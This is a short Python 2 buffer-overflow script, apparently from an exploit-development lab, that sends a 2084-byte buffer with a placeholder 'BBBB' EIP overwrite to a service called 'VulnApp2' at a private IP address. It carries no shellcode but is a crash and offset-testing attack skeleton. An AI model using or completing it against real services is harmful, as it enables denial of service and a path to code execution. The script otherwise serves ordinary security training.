#!/usr/bin/python
import socket
import time

start = "\x40" * 4
payload = "A" * (2080 - int(len(start)))
EIP = "B" * 4
offset = "C" * 12

try:
  print "[*] Starting buffer overflow against VulnApp2"
  
  mybuffer = start + payload + EIP + offset
  
  print "[*] Buffer setup size is: " + str(len(mybuffer)) 
  time.sleep(1)
  print "[*] Sending evil payload"
  time.sleep(1)
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.128.10", 7002))
  s.send(mybuffer)
  s.close()

  print "[*] Done!"
  
except:
  print "[*] Error occure could not connect!"


